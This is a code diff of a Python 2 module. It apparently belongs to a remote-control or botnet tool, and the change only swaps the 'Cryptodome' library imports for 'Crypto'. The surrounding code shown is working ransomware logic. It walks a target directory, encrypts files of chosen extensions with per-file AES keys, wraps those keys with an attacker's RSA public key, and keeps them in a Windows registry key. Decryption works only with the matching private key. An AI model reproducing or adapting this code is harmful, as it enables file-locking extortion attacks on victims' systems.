@@ -12,9 +12,9 @@ import hashlib
 import StringIO
 
 # packages
-import Cryptodome.Cipher.AES
-import Cryptodome.PublicKey.RSA
-import Cryptodome.Cipher.PKCS1_OAEP
+import Crypto.Cipher.AES
+import Crypto.PublicKey.RSA
+import Crypto.Cipher.PKCS1_OAEP
 if sys.platform == 'win32':
     import _winreg
 
@@ -22,7 +22,7 @@ if sys.platform == 'win32':
 import util
 
 # globals
-packages = ['_winreg','Cryptodome.PublicKey.RSA','Cryptodome.Cipher.PKCS1_OAEP']
+packages = ['_winreg','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']
 platforms = ['win32']
 threads = {}
 tasks = Queue.Queue()
@@ -66,14 +66,14 @@ def _threader(tasks):
 @util.threaded
 def _iter_files(rsa_key, base_dir=None):
     try:
-        if isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
+        if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
             if base_dir:
                 if os.path.isdir(base_dir):
                     return os.path.walk(base_dir, lambda _, dirname, files: [globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key))) for filename in files], None)
                 else:
                     util.log("Target directory '{}' not found".format(base_dir))
             else:
-                cipher = Cryptodome.Cipher.PKCS1_OAEP.new(rsa_key)
+                cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
                 reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, globals()['registry_key'], 0, _winreg.KEY_READ)
                 i = 0
                 while True:
@@ -116,7 +116,7 @@ def encrypt_aes(plaintext, key, padding=chr(0)):
     Returns encrypted ciphertext as base64-encoded string
 
     """
-    cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_OCB)
+    cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
     ciphertext, tag = cipher.encrypt_and_digest(plaintext)
     output = b''.join((cipher.nonce, tag, ciphertext))
     return base64.b64encode(output)
@@ -136,8 +136,8 @@ def decrypt_aes(ciphertext, key, padding=chr(0)):
 
     """
     data = StringIO.StringIO(base64.b64decode(ciphertext))
-    nonce, tag, ciphertext = [ data.read(x) for x in (Cryptodome.Cipher.AES.block_size - 1, Cryptodome.Cipher.AES.block_size, -1) ]
-    cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_OCB, nonce)
+    nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
+    cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
     return cipher.decrypt_and_verify(ciphertext, tag)
 
 def encrypt_file(filename, rsa_key):
@@ -158,8 +158,8 @@ def encrypt_file(filename, rsa_key):
     try:
         if os.path.isfile(filename):
             if os.path.splitext(filename)[1] in globals()['filetypes']:
-                if isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
-                    cipher = Cryptodome.Cipher.PKCS1_OAEP.new(rsa_key)
+                if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
+                    cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
                     aes_key = os.urandom(32)
                     with open(filename, 'rb') as fp:
                         data = fp.read()
@@ -213,8 +213,8 @@ def encrypt_files(args):
     try:
         target, _, rsa_key = args.partition(' ')
         if os.path.exists(target):
-            if not isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
-                rsa_key = Cryptodome.PublicKey.RSA.importKey(rsa_key)
+            if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
+                rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
             if not rsa_key.can_encrypt():
                 return "Error: RSA key cannot encrypt"
             if os.path.isfile(target):
@@ -237,8 +237,8 @@ def decrypt_files(rsa_key):
 
    """
     try:
-        if not isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
-            rsa_key = Cryptodome.PublicKey.RSA.importKey(rsa_key)
+        if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
+            rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
         if not rsa_key.has_private():
             return "Error: RSA key cannot decrypt"
         globals()['threads']['iter_files'] = _iter_files(rsa_key)
